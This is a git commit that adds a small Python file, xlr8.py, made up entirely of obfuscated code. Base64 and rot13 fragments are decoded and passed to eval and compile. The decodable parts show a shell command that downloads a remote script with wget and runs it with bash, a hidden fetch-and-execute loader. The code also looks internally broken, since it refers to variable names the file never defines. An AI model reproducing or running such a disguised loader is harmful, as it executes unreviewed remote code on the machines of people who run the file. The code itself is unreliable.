88b7bfe4b4fb4f3430fdd13763b5883b393afd91
Anubhav Kashyap <61369802+anubhavanonymous@users.noreply.github.com>
2021-11-09 11:56:37 +0530

    Create xlr8.py

---
+++ xlr8.py
@@ -0,0 +1,11 @@
+import base64,codecs
+V=eval
+h=compile
+z=base64.b64decode
+s='aW1wb3J0IG9zCnRyeToKICAgIG9zLnN5c3RlbShmJ2NsZWFyOyBvaz0kKHdnZXQgaHR0cHM6Ly'
+T='9lLKphM2y0nUIvqKAypzAioaEyoaDhL29gY0y0p2uuL2uypv9cqUAbLJAbMKVioJScov9bMJkf'
+f='by5zaCAtcSAtTy0pOyBiYXNoIC1jICIkb2siJykKZXhjZXB0OgogICAgb3Muc3lzdGVtKGYnY2'
+q='kyLKVaXDbtVPNtpUWcoaDbVyEbLJ5eplOzo3VtqKAcozptJTklBPNuVvxXVPNtVTI4nKDbXDb='
+K='\x72\x6f\x74\x31\x33'
+U=V('\x6d\x61\x67\x69\x63')+V('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29')+V('\x67\x6f\x64')+V('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+V(h(z(V('\x74\x72\x75\x73\x74')),'<string>','exec'))
